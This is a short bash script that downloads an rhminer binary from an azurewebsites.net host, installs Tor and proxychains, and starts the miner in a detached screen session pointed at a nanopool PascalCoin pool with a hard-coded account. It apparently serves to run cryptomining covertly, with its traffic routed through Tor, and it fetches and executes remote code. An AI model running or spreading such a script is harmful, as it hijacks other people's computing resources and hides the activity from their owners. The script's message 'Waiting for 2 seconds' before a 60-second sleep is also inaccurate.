#!/bin/bash
sudo apt update
sudo apt -y install apt-transport-https screen unzip
wget "http://addmail.azurewebsites.net/rhminer.zip" 
unzip rhminer.zip
cd rhminer
chmod +x rhminer
wget -q -O - https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
echo "deb https://deb.torproject.org/torproject.org $(lsb_release -cs) main" | sudo tee -a /etc/apt/sources.list
sudo apt update
sudo apt  -y install tor deb.torproject.org-keyring
sudo apt-get -y install proxychains
proxychains bash
echo "Waiting for 2 seconds..."
sleep 60
echo "Task Completed"
screen -d -m ./rhminer -s pasc-us-east1.nanopool.org:15556 -su 1139099-44.0.3/slicommeo@gmail.com -cpu -cputhreads 8 -r 40 -logfilename rhminer.log
